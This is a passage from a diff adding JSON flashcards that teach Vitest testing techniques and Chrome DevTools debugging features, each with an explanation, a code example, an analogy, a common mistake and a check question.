+    "plain": "`toBe` checks identity with `Object.is`: for objects that means \"the very same object in memory\". `createTask` returns a new object and the `{ … }` literal in the test is another new object, so they are never the same one. Use `toEqual` to compare objects and arrays field by field. Keep `toBe` for strings, numbers, and booleans, or when you really mean the same instance.",
+    "example": "```ts\nimport { expect, test } from 'vitest'\n\nconst createTask = (title: string) => ({ title, done: false })\n\ntest('createTask builds an open task', () => {\n  const task = createTask('Buy milk')\n  expect(task).toEqual({ title: 'Buy milk', done: false }) // passes\n  expect(task.title).toBe('Buy milk') // passes: strings compare by value\n  // expect(task).toBe({ title: 'Buy milk', done: false }) // fails\n})\n```\n\nThe commented-out `toBe` line fails with `// Object.is equality`, and Vitest's message suggests a deep-equality matcher instead: same fields, different objects.",
+    "analogy": "`toBe` asks \"is this the same house?\" `toEqual` asks \"do these two houses have the same rooms and furniture?\" Two houses built from one blueprint pass the second question and fail the first.",
+    "mistake": "Forgetting that `toEqual` ignores properties whose value is `undefined`: `{ title: 'a', due: undefined }` passes `toEqual({ title: 'a' })`. When \"missing\" versus \"set to undefined\" matters, such as a PATCH body, use `toStrictEqual`, which also checks those keys.",
+    "check": "Predict the result of expect(getTags()).toBe(['work', 'home']) when getTags() returns ['work', 'home'], and write the fixed assertion.",
+    "answer": "**It fails.** `getTags()` returns a new array and the literal is a different array, so `Object.is` is false. Fix: `expect(getTags()).toEqual(['work', 'home'])`. Order still matters: `toEqual(['home', 'work'])` would fail."
+  },
+  {
+    "key": "app-vitest-rejects",
+    "deck": 7006,
+    "title": "Assert a rejected promise with rejects",
+    "aliases": [
+      "resolves",
+      "async errors"
+    ],
+    "question": "How do you check in Vitest that an async saveTask({ title: '' }) rejects with the message 'Title is required'?",
+    "plain": "Pass the promise to `expect`, chain `.rejects`, then a matcher: `await expect(saveTask({ title: '' })).rejects.toThrow('Title is required')`. `.rejects` waits for the promise and hands its rejection reason to `toThrow`, which checks that the error message contains the text. `await` keeps the test running until the check is done. `.resolves` is the mirror image for a promise that should succeed.",
+    "example": "```ts\nimport { expect, test } from 'vitest'\n\nasync function saveTask(input: { title: string }) {\n  if (!input.title.trim()) throw new Error('Title is required')\n  return { id: 1, ...input }\n}\n\ntest('blank title is rejected', async () => {\n  await expect(saveTask({ title: '  ' })).rejects.toThrow('Title is required')\n  await expect(saveTask({ title: 'Buy milk' })).resolves.toEqual({ id: 1, title: 'Buy milk' })\n})\n```\n\nBoth lines check a promise: one must fail with that message, the other must succeed with that value.",
+    "analogy": "Checking a promise without waiting is like marking a parcel \"returned\" the moment you post it. `await expect(...).rejects` waits for the parcel to come back, then reads the reason on the return label.",
+    "mistake": "Leaving out `await`. Vitest 4 still runs the check when the test ends, but prints \"Promise returned by ... was not awaited\" and warns that the next major version will fail the test. Always write `await expect(...).rejects...` inside an `async` test.",
+    "check": "Predict what expect(() => saveTask({ title: '' })).toThrow('Title is required') does in Vitest when saveTask is an async function that throws for a blank title.",
+    "answer": "**The assertion fails** (\"expected [Function] to throw an error\"). An async function never throws synchronously: calling it returns a rejected promise, so the arrow function returns normally. Use `await expect(saveTask({ title: '' })).rejects.toThrow('Title is required')`."
+  },
+  {
+    "key": "app-vitest-vi-fn",
+    "deck": 7006,
+    "title": "Record calls with a vi.fn mock",
+    "aliases": [
+      "mock function",
+      "toHaveBeenCalledWith"
+    ],
+    "question": "A submitTask(title, create, onSaved) helper should call onSaved once with the created task. How can a Vitest test check that without a real API or callback?",
+    "plain": "Pass mock functions made with `vi.fn()`. A mock records every call, so afterwards you can assert `toHaveBeenCalledTimes(1)` and `toHaveBeenCalledWith(...)`. You can also script what it returns: `vi.fn().mockResolvedValue(task)` acts like an async API call that succeeds with `task`. The test then checks the helper's real logic without any network.",
+    "example": "```js\nimport { expect, test, vi } from 'vitest'\n\nasync function submitTask(title, create, onSaved) {\n  const task = await create({ title: title.trim() })\n  onSaved(task)\n}\n\ntest('passes the created task to onSaved', async () => {\n  const create = vi.fn().mockResolvedValue({ id: 7, title: 'Buy milk' })\n  const onSaved = vi.fn()\n  await submitTask(' Buy milk ', create, onSaved)\n  expect(create).toHaveBeenCalledWith({ title: 'Buy milk' })\n  expect(onSaved).toHaveBeenCalledTimes(1)\n  expect(onSaved).toHaveBeenCalledWith({ id: 7, title: 'Buy milk' })\n})\n```\n\nThe first assertion also proves the title was trimmed before it reached the API.",
+    "analogy": "A `vi.fn()` is a stand-in actor with a notebook: it says whatever lines you script, and writes down every time it was called and with what, so the test can read the notebook afterwards.",
+    "mistake": "Asserting only `toHaveBeenCalled()`. That passes even if the callback received the wrong task or ran three times. Check the arguments with `toHaveBeenCalledWith` and the count with `toHaveBeenCalledTimes`. Mock the collaborators, never the function you are testing.",
+    "check": "Write a Vitest mock for an async deleteTask API call that fails once with new Error('Network down'), so you can test the error message a screen shows.",
+    "answer": "**`const deleteTask = vi.fn().mockRejectedValueOnce(new Error('Network down'))`.** The first call returns a rejected promise; later calls fall back to the default and return `undefined`. Pass it where the code expects the API function, then assert on the error text the UI renders."
+  },
+  {
+    "key": "app-vitest-spyon",
+    "deck": 7006,
+    "title": "Watch an existing method with vi.spyOn",
+    "aliases": [
+      "spy",
+      "restoreAllMocks",
+      "mockRestore"
+    ],
+    "question": "When would you use vi.spyOn(console, 'error') instead of vi.fn(), and how do you put the real console.error back afterwards?",
+    "plain": "Use `vi.spyOn(object, 'method')` when the code calls a method on an existing object, such as `console.error` or `Math.random`, instead of receiving a function you can pass in. The spy replaces the method in place and records calls; by default it still calls the original. Add `.mockImplementation(() => {})` to silence it. Put the original back with `spy.mockRestore()`, or `vi.restoreAllMocks()` in `afterEach`.",
+    "example": "```ts\nimport { afterEach, expect, test, vi } from 'vitest'\n\nfunction reportSaveError(err: Error) {\n  console.error('Save failed:', err.message)\n}\n\nafterEach(() => vi.restoreAllMocks())\n\ntest('logs the failure message', () => {\n  const spy = vi.spyOn(console, 'error').mockImplementation(() => {})\n  reportSaveError(new Error('timeout'))\n  expect(spy).toHaveBeenCalledWith('Save failed:', 'timeout')\n})\n```\n\nThe empty implementation keeps test output clean; `restoreAllMocks` puts the real `console.error` back after each test.",
+    "analogy": "A spy is a call logger fitted to an existing phone line: calls still go through unless you reroute them, and each one is written down. Restoring removes the logger and leaves the line as it was.",
+    "mistake": "Forgetting to restore. A silenced `console.error` spy stays in place for the rest of the file, so later tests hide real warnings, such as React errors. Restore in `afterEach`, or set `restoreMocks: true` in the Vitest config.",
+    "check": "A test calls vi.spyOn(Math, 'random').mockReturnValue(0.5) to make a shuffle predictable. What should run after that test, and what goes wrong without it?",
+    "answer": "**Call `vi.restoreAllMocks()` (or the spy's `mockRestore()`) in `afterEach`.** Without it, `Math.random` keeps returning 0.5 for later tests in that file, so code that relies on randomness, like generated IDs, behaves differently and results start depending on test order."
+  },
+  {
+    "key": "app-vitest-vi-mock",
+    "deck": 7006,
+    "title": "Replace an imported module with vi.mock",
+    "aliases": [
+      "module mock",
+      "vi.hoisted",
+      "vi.mocked"
+    ],
+    "question": "dashboard.ts imports fetchTasks from './api'. How can a Vitest test make fetchTasks return fake tasks without editing dashboard.ts?",
+    "plain": "Call `vi.mock('./api', () => ({ fetchTasks: vi.fn() }))` in the test file. Vitest moves (hoists) `vi.mock` above the imports, so every module that imports `./api`, including the code under test, receives the fake exports. The path is relative to the test file. Then pick data per test with `vi.mocked(fetchTasks).mockResolvedValue([...])`; `vi.mocked` only adds mock typings for TypeScript.",
+    "example": "```ts\nimport { expect, test, vi } from 'vitest'\nimport { fetchTasks } from './api'\nimport { countOpenTasks } from './dashboard'\n\nvi.mock('./api', () => ({ fetchTasks: vi.fn() }))\n\ntest('counts only open tasks', async () => {\n  vi.mocked(fetchTasks).mockResolvedValue([\n    { id: 1, title: 'Buy milk', done: false },\n    { id: 2, title: 'Pay rent', done: true },\n  ])\n  expect(await countOpenTasks()).toBe(1)\n})\n```\n\n`vi.mock` takes effect before the imports even though it is written below them, so `countOpenTasks` calls the fake.",
+    "analogy": "`vi.mock` is like changing a supplier on a restaurant's order sheet before the kitchen opens: every cook who orders from `./api` gets your stand-in goods, and no recipe changes.",
+    "mistake": "Reaching for `vi.mock` when a simpler seam exists. If the function can take the dependency as a parameter or prop, pass a `vi.fn()` instead. Module mocks are invisible in the code under test and easy to leave stale.",
+    "check": "A test file has const fakeFetch = vi.fn() on line 3 and vi.mock('./api', () => ({ fetchTasks: fakeFetch })) on line 4, and the code under test imports './api'. Why does it fail, and what is the fix?",
+    "answer": "**`vi.mock` is hoisted above line 3**, so its factory runs when `./api` is first imported, before `fakeFetch` exists. Vitest reports an error saying there must be no top-level variables inside the factory. Fix: `const { fakeFetch } = vi.hoisted(() => ({ fakeFetch: vi.fn() }))`, which is hoisted too."
+  },
+  {
+    "key": "app-vitest-stub-fetch",
+    "deck": 7006,
+    "title": "Stub the global fetch with vi.stubGlobal",
+    "aliases": [
+      "mock fetch",
+      "unstubAllGlobals"
+    ],
+    "question": "loadTasks() calls the global fetch('/api/tasks'). How can a Vitest test make fetch return a fake 200 JSON response without running a server?",
+    "plain": "Replace the global with `vi.stubGlobal('fetch', vi.fn().mockResolvedValue(Response.json(tasks)))`. The code calls the stub instead of the network and gets a real `Response`, so `res.ok`, `res.status`, and `res.json()` behave as usual. `Response` is built into Node 18+ and browsers. Undo the stub with `vi.unstubAllGlobals()` in `afterEach`, or set `unstubGlobals: true` in the config.",
+    "example": "```ts\nimport { afterEach, expect, test, vi } from 'vitest'\nimport { loadTasks } from './tasks-client'\n\nafterEach(() => vi.unstubAllGlobals())\n\ntest('returns the parsed task list', async () => {\n  const fetchMock = vi.fn().mockResolvedValue(Response.json([{ id: 1, title: 'Buy milk' }]))\n  vi.stubGlobal('fetch', fetchMock)\n\n  expect(await loadTasks()).toEqual([{ id: 1, title: 'Buy milk' }])\n  expect(fetchMock).toHaveBeenCalledWith('/api/tasks')\n})\n```\n\n`Response.json(data)` builds a 200 response with a JSON content type, so the client code runs unchanged.",
+    "analogy": "Stubbing fetch is like pointing a speed-dial entry at a recorded message: the code dials the same number, but hears the script you prepared.",
+    "mistake": "Resolving the stub with a plain object such as `{ json: async () => tasks }`. It has no `ok`, so a check like `if (!res.ok) throw ...` treats every call as a failure. Return a real `Response`, and add a second test with `{ status: 500 }` for the error path.",
+    "check": "Write a Vitest stub that makes the next fetch call return an HTTP 500, so you can test the error path of a loadTasks() that throws when res.ok is false.",
+    "answer": "**`vi.stubGlobal('fetch', vi.fn().mockResolvedValue(new Response('oops', { status: 500 })))`.** Real fetch resolves (it does not reject) for HTTP errors, so the stub resolves too, with `ok` false. Then assert `await expect(loadTasks()).rejects.toThrow('Load failed: 500')` if that is its message."
+  },
+  {
+    "key": "app-vitest-fake-timers",
+    "deck": 7006,
+    "title": "Control a debounce with fake timers",
+    "aliases": [
+      "useFakeTimers",
+      "advanceTimersByTime",
+      "setSystemTime"
+    ],
+    "question": "A note editor saves a draft 500 ms after the last keystroke. How can a Vitest test check that without really waiting half a second?",
+    "plain": "Call `vi.useFakeTimers()` before the code schedules its timer. Vitest then swaps `setTimeout`, `setInterval`, `Date`, and similar APIs for a fake clock that only moves when you tell it to. Trigger the code, assert nothing happened yet, then `vi.advanceTimersByTime(500)` runs every timer that is due, instantly. Call `vi.useRealTimers()` in `afterEach`.",
+    "example": "```ts\nimport { afterEach, beforeEach, expect, test, vi } from 'vitest'\nimport { debounce } from './debounce'\n\nbeforeEach(() => vi.useFakeTimers())\nafterEach(() => vi.useRealTimers())\n\ntest('saves once, 500 ms after the last call', () => {\n  const save = vi.fn()\n  const saveDraft = debounce(save, 500)\n  saveDraft('b'); saveDraft('bu'); saveDraft('buy')\n  vi.advanceTimersByTime(499)\n  expect(save).not.toHaveBeenCalled()\n  vi.advanceTimersByTime(1)\n  expect(save).toHaveBeenCalledWith('buy')\n})\n```\n\nThe test runs in milliseconds and pins the exact boundary: nothing at 499 ms, one save at 500 ms.",
+    "analogy": "Fake timers turn the test's clock into a hand-cranked one: nothing ticks by itself, and each `advanceTimersByTime` turns the crank by exactly that many milliseconds.",
+    "mistake": "Turning on fake timers after the code already scheduled its timer. That timer was created with the real `setTimeout`, so `advanceTimersByTime` cannot fire it. Enable fake timers first (in `beforeEach`), and restore real ones in `afterEach` so later tests do not inherit a frozen clock.",
+    "check": "Predict what new Date().toISOString() returns after a Vitest test calls vi.useFakeTimers() and then vi.setSystemTime(new Date('2026-01-31T12:00:00Z')). Why does that help?",
+    "answer": "**'2026-01-31T12:00:00.000Z'**, and it stays there until the test advances the timers. `setSystemTime` sets the fake clock's current date, so a rule like \"is this task overdue?\" gives the same result on every run instead of depending on the real day."
+  },
+  {
+    "key": "app-vitest-findby",
+    "deck": 7006,
+    "title": "Wait for loaded UI with findBy queries",
+    "aliases": [
+      "getBy",
+      "queryBy",
+      "Testing Library queries"
+    ],
+    "question": "A TaskList component loads tasks in an effect. Why does screen.getByText('Buy milk') fail right after render(), and which query should the test use?",
+    "plain": "The first render shows the loading state; the tasks arrive a moment later, when the promise resolves and state updates. `getBy…` queries look once, right now, and throw if nothing matches. `await screen.findByText('Buy milk')` retries until the element appears or 1000 ms (the default timeout) pass. So: `getBy` for what is on screen now, `findBy` for what will appear, `queryBy` to check something is absent.",
+    "example": "```tsx\nimport { render, screen } from '@testing-library/react'\nimport { expect, test, vi } from 'vitest'\nimport { TaskList } from './TaskList'\n\ntest('shows tasks after loading', async () => {\n  const loadTasks = vi.fn().mockResolvedValue([{ id: 1, title: 'Buy milk' }])\n  render(<TaskList loadTasks={loadTasks} />)\n\n  expect(screen.getByText('Loading…')).toBeInTheDocument()\n  expect(await screen.findByText('Buy milk')).toBeInTheDocument()\n  expect(screen.queryByText('Loading…')).not.toBeInTheDocument()\n})\n```\n\n`toBeInTheDocument` comes from `@testing-library/jest-dom`, loaded once in a setup file.",
+    "analogy": "`getBy` looks out of the window once and complains if the parcel is not there. `findBy` keeps checking for up to a second until it arrives. `queryBy` just reports \"nothing there\" without raising an alarm.",
+    "mistake": "Forgetting `await` before `findBy…`. It returns a promise, and a promise is not an element, so `expect(screen.findByText('Buy milk')).toBeInTheDocument()` fails with a message that the received value must be an HTMLElement or an SVGElement.",
+    "check": "After a test clicks Delete, the 'Buy milk' row should be gone. Why does expect(screen.getByText('Buy milk')).not.toBeInTheDocument() throw instead of passing?",
+    "answer": "**`getByText` throws when nothing matches**, so the test errors with \"Unable to find an element\" before `.not` is checked. Use `queryByText`, which returns `null` for no match: `expect(screen.queryByText('Buy milk')).not.toBeInTheDocument()`."
+  },
+  {
+    "key": "app-vitest-user-event",
+    "deck": 7006,
+    "title": "Type and click like a user with userEvent",
+    "aliases": [
+      "fireEvent",
+      "user-event",
+      "userEvent.setup"
+    ],
+    "question": "Why does user-event's await user.type(input, 'Buy milk') test a form more realistically than fireEvent.change(input, { target: { value: 'Buy milk' } })?",
+    "plain": "`fireEvent.change` sets the final value and dispatches one event. `user.type` acts like a person: it clicks the field to focus it, then sends key and input events for each character, so key handlers, `maxLength`, and disabled fields behave as they would in a browser. Create the user with `const user = userEvent.setup()` in each test and `await` every action.",
+    "example": "```tsx\nimport { render, screen } from '@testing-library/react'\nimport userEvent from '@testing-library/user-event'\nimport { expect, test, vi } from 'vitest'\nimport { NewTaskForm } from './NewTaskForm'\n\ntest('submits the typed title', async () => {\n  const user = userEvent.setup()\n  const onCreate = vi.fn()\n  render(<NewTaskForm onCreate={onCreate} />)\n\n  await user.type(screen.getByLabelText('Title'), 'Buy milk')\n  await user.click(screen.getByRole('button', { name: 'Add task' }))\n  expect(onCreate).toHaveBeenCalledWith('Buy milk')\n})\n```\n\nClicking the submit button fires the form's `onSubmit`, as a real click would.",
+    "analogy": "`fireEvent.change` teleports the text into the box. `user.type` sits down at the keyboard and types it, so everything listening along the way notices each key.",
+    "mistake": "Forgetting `await` on user-event calls. In user-event 14 every action returns a promise; without `await`, the next assertion can run before typing finishes and fail, or pass by luck.",
+    "check": "Predict the value of a maxLength={5} title input after await user.type(input, 'Buy milk'), and separately after fireEvent.change(input, { target: { value: 'Buy milk' } }).",
+    "answer": "**user.type leaves 'Buy m'; fireEvent.change leaves 'Buy milk'.** user-event types key by key and respects `maxLength` like a browser. `fireEvent.change` sets the `value` property directly, and setting `value` from code bypasses `maxLength` in real browsers too."
+  },
+  {
+    "key": "app-vitest-api-listen0",
+    "deck": 7006,
+    "title": "Test an HTTP API on a random free port",
+    "aliases": [
+      "listen(0)",
+      "EADDRINUSE",
+      "integration test server"
+    ],
+    "question": "Why should a Vitest API test start the server with server.listen(0) instead of a fixed port like 3000?",
+    "plain": "Port 0 asks the operating system for any free port. The test reads the real one from `server.address().port` and sends requests there. A fixed port collides with a dev server already on 3000, or with another test file running in parallel, and fails with `EADDRINUSE`. Start the server in `beforeAll`, close it in `afterAll`, and call it with `fetch`, the way real clients do.",
+    "example": "```ts\nimport { afterAll, beforeAll, expect, test } from 'vitest'\nimport type { AddressInfo } from 'node:net'\nimport { createServer } from 'node:http'\nimport { app } from './app' // an Express app or any (req, res) handler\n\nconst server = createServer(app)\nlet baseUrl = ''\nbeforeAll(async () => {\n  await new Promise<void>((resolve) => server.listen(0, '127.0.0.1', resolve))\n  baseUrl = `http://127.0.0.1:${(server.address() as AddressInfo).port}`\n})\nafterAll(() => new Promise<void>((resolve) => server.close(() => resolve())))\ntest('GET /health returns 200', async () => {\n  expect((await fetch(`${baseUrl}/health`)).status).toBe(200)\n})\n```\n\nThe request goes through the real HTTP stack: routing, headers, and status codes.",
+    "analogy": "Port 0 is like asking a restaurant for \"any free table\" instead of insisting on table 3 every visit. You just read the table number off your ticket before ordering.",
+    "mistake": "Reading the port before `listen` has finished. Until the server is listening, `server.address()` returns `null`, so the base URL breaks. Await the `listen` callback in `beforeAll`, and close the server in `afterAll` so no open handle outlives the file.",
+    "check": "Two API test files both call app.listen(3000), and Vitest runs the files in parallel. One fails during startup. What error do you expect, and what is the fix?",
+    "answer": "**`EADDRINUSE` (address already in use)**: the second file tries to bind port 3000 while the first holds it. Listen on port 0 in each file and build the base URL from `server.address().port`, so every file gets its own free port."
+  },
+  {
+    "key": "app-devtools-request-tabs",
+    "deck": 7007,
+    "title": "Read a request in the Network panel",
+    "aliases": [
+      "Payload tab",
+      "Response tab"
+    ],
+    "question": "In the Chrome Network panel, which tabs of a selected request show what your page sent and what the server answered?",
+    "plain": "Select the request row and read its tabs. Headers shows the URL, method, status code, and the request and response headers. Payload shows the query string and the body your code sent (form data or JSON). Preview shows the response formatted, such as JSON as a tree; Response shows the raw body text. Timing shows where the time went. The Fetch/XHR filter hides images and scripts so your API calls stand out.",
+    "example": "```js\nconst res = await fetch('/api/tasks', {\n  method: 'POST',\n  headers: { 'Content-Type': 'application/json' },\n  body: JSON.stringify({ title: '  ' }),\n});\nconsole.log(res.status, await res.text());\n// 422 {\"error\":\"title is required\"}\n```\nFor this request, Payload would show the blank title your code sent, and Response would show the server's reason for the 422 even if the UI only says \"Save failed\".",
+    "analogy": "A request is like a posted parcel. Headers is the shipping label (where it went and how it was handled), Payload is what you packed, and Response is the reply letter that came back.",
+    "mistake": "Trusting Preview when response.json() throws. Preview formats what it can; check Response for the raw text. If it starts with <!DOCTYPE, the server sent an HTML error page, and JSON.parse fails with \"Unexpected token '<'\".",
+    "check": "Your form shows \"Save failed\" and the Network row for POST /api/tasks has status 422. Which request tabs tell you why the server rejected it?",
+    "answer": "**Response (or Preview), then Payload.** A 422 means the server understood the request but refused its content, and the body usually says why, e.g. `{\"error\":\"title is required\"}`. Payload then shows what your code actually sent, such as a title of only spaces."
+  },
+  {
+    "key": "app-devtools-preserve-log",
+    "deck": 7007,
+    "title": "Keep requests across redirects with Preserve log",
+    "aliases": [],
+    "question": "After a login form posts and the page redirects, the POST disappears from the Network panel. Which setting keeps it in the list?",
+    "plain": "Turn on Preserve log in the Network panel. Without it, the request list starts fresh on each page load, so a form POST followed by a redirect to /dashboard is gone before you can read it. With Preserve log on, DevTools keeps requests across page loads until you turn it off. You can then open the POST and read its status, payload, Location header and Set-Cookie. The Console has its own Preserve log setting.",
+    "example": "```js\n// POST /login: set the session cookie, then redirect (Post/Redirect/Get)\nif (req.method === 'POST' && req.url === '/login') {\n  res.writeHead(303, { Location: '/dashboard', 'Set-Cookie': 'sid=abc; HttpOnly; Path=/' });\n  return res.end();\n}\n```\nCalling this node:http handler with curl -i -L printed 303 See Other (with the Location and Set-Cookie headers) and then 200 OK for /dashboard. In the browser, Preserve log is what keeps that 303 row after the page changes.",
+    "analogy": "It is like a dashcam that keeps recording when you turn onto a new road, instead of wiping the footage at every junction.",
+    "mistake": "Leaving Preserve log on and then reading old rows as if they came from the latest attempt. Clear the request list right before you reproduce the problem, so every row belongs to this run.",
+    "check": "A \"Sign in with Google\" flow bounces through several redirects and lands back on /login. How can the Network panel show you which hop went wrong?",
+    "answer": "**Turn on Preserve log, clear the list, then repeat the login.** Every hop stays visible after each navigation, so you can read each response's status, Location and Set-Cookie headers and find the one that sends you back to /login, for example a callback that never set the session cookie."
+  },
+  {
+    "key": "app-devtools-cache-throttle",
+    "deck": 7007,
+    "title": "Disable the cache and throttle the network",
+    "aliases": [
+      "Slow 4G",
+      "network throttling"
+    ],
+    "question": "What do the Network panel's Disable cache checkbox and throttling presets let you reproduce on a fast development machine?",
+    "plain": "Disable cache makes requests skip the browser's HTTP cache, like a first-time visitor, and only applies while DevTools is open. Throttling presets such as Fast 4G, Slow 4G, 3G and Offline slow or cut the connection, so you can see loading states, timeouts and double clicks that a local server hides. A service worker can still answer requests with Disable cache on; its own Bypass for network option is in the Application panel.",
+    "example": "```jsx\nfunction TaskList({ status, tasks }) {\n  if (status === 'loading') return <p>Loading tasks…</p>;\n  if (status === 'error') return <p>Could not load tasks.</p>;\n  return tasks.length ? <List items={tasks} /> : <p>No tasks yet.</p>;\n}\n```\nOn localhost the loading branch may flash for a frame. Under Slow 4G it stays on screen long enough to check its wording, and Offline lets you see the error branch.",
+    "analogy": "Disable cache is visiting a shop as a new customer instead of a regular whose order is already waiting. Throttling is driving the route at rush hour instead of at 3 a.m.",
+    "mistake": "Forgetting that throttling is still on and chasing a \"slow app\" (DevTools shows a warning icon on the Network tab while it is enabled). Also expecting Disable cache to keep working after you close DevTools; it does not.",
+    "check": "You changed styles.css on the dev server, but reloading still shows the old rules. Which Network panel setting makes reloads fetch fresh copies, and when does it apply?",
+    "answer": "**Disable cache.** While it is checked and DevTools is open, reloads skip the HTTP cache, so styles.css is fetched from the server like a first visit. A service worker can still serve the old file, because Disable cache does not bypass it; for that, also turn on Bypass for network in the Application panel."
+  },
+  {
+    "key": "app-devtools-copy-as-curl",
+    "deck": 7007,
+    "title": "Replay a request with Copy as cURL",
+    "aliases": [
+      "Copy as fetch"
+    ],
+    "question": "Why copy a failing request from the Network panel as cURL or fetch instead of retyping it by hand?",
+    "plain": "Copy as cURL (also Copy as fetch, fetch for Node.js, or PowerShell) turns the exact request the browser sent, including URL, method, headers and body, into a command you can rerun. Replaying it in a terminal and changing one thing at a time shows whether the server or the page is at fault, and gives a teammate an exact reproduction. The copy can include Cookie and Authorization headers, so treat it like a password.",
+    "example": "```bash\n# Copied from the Network panel, trimmed, then replayed\ncurl -i 'http://localhost:3000/api/tasks' \\\n  -H 'content-type: application/json' \\\n  --data-raw '{\"title\":\"  \"}'\n# HTTP/1.1 422 Unprocessable Entity\n# {\"error\":\"title is required\"}\n```\nEditing only the body to {\"title\":\"Buy milk\"} returned 201 Created, so the server rule works and the bug is in what the form sends.",
+    "analogy": "It is a photocopy of the exact form that was submitted, rather than your memory of what someone probably wrote on it.",
+    "mistake": "Pasting the copied command into a ticket or chat unchanged. If it carries your session cookie or bearer token, anyone who reads it can act as you until that credential expires. Remove the cookie (Chrome copies it as a -b flag) and any Authorization header first.",
+    "check": "A POST works from Postman but fails from your React page. How can the Network panel give you an exact command to compare with the Postman request?",
+    "answer": "**Copy the failing request as cURL and replay it.** If it also fails in the terminal, compare its headers and body with Postman's; a missing Content-Type or a renamed JSON field is common. If it succeeds there, the difference lives in the browser, such as CORS or cookies."
+  },
+  {
+    "key": "app-devtools-source-maps",
+    "deck": 7007,
+    "title": "Map minified stack traces with source maps",
+    "aliases": [],
+    "question": "A production error shows the stack frame \"at n (index-4f2a.js:1:24)\". What turns it back into your file, function and line?",
+    "plain": "A source map. Bundlers such as Vite minify your code into long lines with short names, so raw stack frames point at a column in a bundle. A source map is a separate .map file that links those positions back to the original file, line and name. When DevTools can load it, Console stack traces, the Sources panel and breakpoints show your original code. Vite only generates production source maps if you set build.sourcemap.",
+    "example": "```text\n$ node app.min.js\n    at n (app.min.js:1:24)\n    at e (app.min.js:1:70)\n$ node --enable-source-maps app.min.js\n    at formatName (profile.js:2:15)\n    at renderProfile (profile.js:5:17)\n```\nSame crash and same terser-minified bundle with a .map file beside it. Node's --enable-source-maps does what DevTools does for you: it maps each frame back to the original function name and line.",
+    "analogy": "A source map is like the index that links each page of a printed, reformatted edition back to the page and line in the author's manuscript.",
+    "mistake": "Publishing .map files to every visitor without meaning to; they expose your original source. Vite's build.sourcemap: 'hidden' creates the maps without the sourceMappingURL comment, so you can upload them to an error tracker instead.",
+    "check": "You deploy a Vite app with default build settings, and a user's console shows \"at e (index-9c1d.js:1:3120)\". Why can't DevTools show your source code?",
+    "answer": "**No source map was generated.** Vite's build.sourcemap defaults to false, so the bundle has no .map file for DevTools to load. Set it to true (public maps) or 'hidden' (maps for an error tracker only), rebuild, and reproduce the error."
+  },
+  {
+    "key": "app-devtools-breakpoint-kinds",
+    "deck": 7007,
+    "title": "Choose the right kind of breakpoint",
+    "aliases": [
+      "logpoint",
+      "DOM breakpoint",
+      "XHR breakpoint"
+    ],
+    "question": "Which DevTools breakpoint kinds help you find the code that sends a wrong request or changes an element, without knowing the file?",
+    "plain": "An XHR/fetch breakpoint pauses when a request URL contains text you enter, on the line that sends it. A DOM change breakpoint on an element pauses on the code that changes its attributes, its children (subtree), or removes it. Event listener breakpoints pause in handlers for events like click. A logpoint prints values to the Console without pausing or editing your code, and exception breakpoints pause where an error is thrown.",
+    "example": "```js\nconst filter = {}; // a caller forgot to set status\nconst params = new URLSearchParams({ status: filter.status });\nconsole.log(String(params));\n// status=undefined\nfetch(`/api/tasks?${params}`);\n```\nAn XHR/fetch breakpoint on \"status=undefined\" pauses on the fetch call, and the Call Stack shows which component built the filter without a status.",
+    "analogy": "A line breakpoint is a guard at one door. A DOM or fetch breakpoint is an alarm on the valuable itself: it rings no matter which door the intruder used.",
+    "mistake": "Scattering console.log lines through many files to trace one value, then committing some by accident. A logpoint prints the same values without changing your source.",
+    "check": "A toast element keeps getting the class \"hidden\" added, and you cannot find the code that does it. Which breakpoint pauses on that code?",
+    "answer": "**A DOM change breakpoint on attribute modifications.** Select the toast in the Elements panel and break on attribute modifications. The next time any script changes its class attribute, DevTools pauses on that line, and the Call Stack shows who called it."
+  },
+  {
+    "key": "app-devtools-httponly-cookies",
+    "deck": 7007,
+    "title": "Inspect HttpOnly cookies in the Application panel",
+    "aliases": [],
+    "question": "Why can the Application panel list a session cookie that document.cookie in the Console does not print?",
+    "plain": "The cookie was set with HttpOnly. HttpOnly cookies are sent with matching requests but hidden from page JavaScript: document.cookie leaves them out and cannot overwrite them. DevTools is not page JavaScript, so the Application panel's cookie table lists every cookie for the origin, with Domain, Path, Expires, HttpOnly, Secure and SameSite columns, and lets you edit or delete them. That table is where you check whether a login cookie exists.",
+    "example": "```text\nSet-Cookie: sid=abc123; HttpOnly; Path=/; SameSite=Lax\nSet-Cookie: theme=dark; Path=/\n\ndocument.cookie                 -> \"theme=dark\"\ndocument.cookie = 'sid=hacked'  -> still \"theme=dark\"\nCookie header on fetch('/echo') -> sid=abc123; theme=dark\n```\nIn Chrome, the page script could neither read nor replace sid, yet the browser still sent it to the server.",
+    "analogy": "An HttpOnly cookie is a sealed envelope the courier carries on every trip. It always reaches the server, but your page script cannot open or swap it.",
+    "mistake": "Deciding \"the login cookie is missing\" because document.cookie does not show it, or trying to read the session token in JavaScript to build an Authorization header. With an HttpOnly session cookie the browser sends it for you.",
+    "check": "After login, console.log(document.cookie) prints an empty string, but API calls still succeed. Is the session cookie missing?",
+    "answer": "**Probably not; it is most likely HttpOnly.** HttpOnly cookies are hidden from document.cookie but still sent on matching requests, which is why the API works. Confirm it in the Application panel's cookie table (HttpOnly checked) or in the request's Cookies tab in the Network panel."
+  },
+  {
+    "key": "app-devtools-service-worker",
+    "deck": 7007,
+    "title": "Control a stale service worker",
+    "aliases": [
+      "PWA update",
+      "Update on reload"
+    ],
+    "question": "Your PWA keeps loading the previous deploy's JavaScript after a reload. What can the Application panel's service worker section do about it?",
+    "plain": "It shows the service worker controlling the page and whether a newer one is waiting to activate. Update on reload installs and activates the latest worker on every load; Bypass for network sends requests straight to the network; Unregister removes the worker; and a waiting worker can be promoted with skipWaiting. A waiting worker means the new code is installed, but the old worker still controls the page.",
+    "example": "```js\n// sw.js: cache-first, so a cached copy always wins\nself.addEventListener('fetch', (event) => {\n  event.respondWith(\n    caches.match(event.request).then((hit) => hit ?? fetch(event.request)),\n  );\n});\n```\nWith this worker a cached index.html keeps pointing at the old hashed bundle after a deploy. Bypass for network makes the page load from the server again while you debug.",
+    "analogy": "The service worker is a receptionist answering calls from yesterday's notes. Until you replace the receptionist or route calls around them, nobody reaches the updated office.",
+    "mistake": "Pressing reload again and again and expecting the new worker to take over. During a refresh the old worker keeps control, so a waiting worker stays waiting until every tab using the old one closes, or skipWaiting runs.",
+    "check": "After your deploy, the Application panel shows a new service worker \"waiting to activate\" while the page still runs old code. What does that mean?",
